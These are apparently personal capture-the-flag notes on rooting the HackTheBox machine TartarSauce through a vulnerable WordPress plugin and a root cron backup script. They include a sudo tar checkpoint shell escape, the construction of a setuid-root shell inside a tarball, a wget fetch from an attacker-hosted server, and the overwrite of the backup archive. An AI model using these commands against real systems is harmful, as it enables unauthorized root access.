port 80
http://tartarsauce.htb/robots.txt
![[Pasted image 20221201213750.png]]
monstra-3.0.4/
/wp
![[Pasted image 20230126094040.png]]
### Monstra 3.0.4 

Was basically a rabbit hole meme

### WordPress

`wpscan --url http://tartarsauce.htb/webservices/wp/ --plugins-detection aggressive`

![[Pasted image 20230126094543.png]]
![[Pasted image 20230126094846.png]]
![[Pasted image 20230126094819.png]]
https://www.exploit-db.com/exploits/38861
![[Pasted image 20230126095036.png]]

![[Pasted image 20230126095428.png]]
```
sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
![[Pasted image 20230126095520.png]]
![[Pasted image 20230126100535.png]]
running linpeas
![[Pasted image 20230126105923.png]]
there is a script that runs every 5 min
```bash
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi

```

This script is a backup program that backs up the files in the directory "/var/www/html" and saves the backup in the directory "/var/backups" with the file name "onuma-www-dev.bak". It also includes a function to check the integrity of the backup to ensure that the backup is complete and not corrupted. If the integrity check fails, an error message is saved in the file "onuma_backup_error.txt" in the directory "/var/backups", otherwise the backup is saved and the temporary files are deleted. The script also includes some additional functionality such as creating a message with the date and time of the last backup in the file "onuma_backup_test.txt" in the directory "/var/backups" and using a random number for the temporary file name for added security.

It also use sudo to run tar command as onuma user, it look like this script is written to be run as root user.


first we send /bin/sh to our attacker machine to change it's owner to root and give it SETUID 
create directory var/www/html/ and add sh binary to it
tar the whole directory up
send it to the target
overwrite the tar file that script creates


```
cp /bin/sh .
python3 -m http.server 8000
wget http://$ip/sh .
sudo chown root:root sh
sudo chmod 6777 sh
mkdir -p var/www/html
mv sh var/www/html/
tar -zcvf pwn.tar.gz var/

```

![[Pasted image 20230126111659.png]]

```
cp pwn.tar.gz .03c9d95e1cfa88892ad1cdfa8d7143446e8b9a98
```
![[Pasted image 20230126112344.png]]
![[Pasted image 20230126112419.png]]
and we are root!
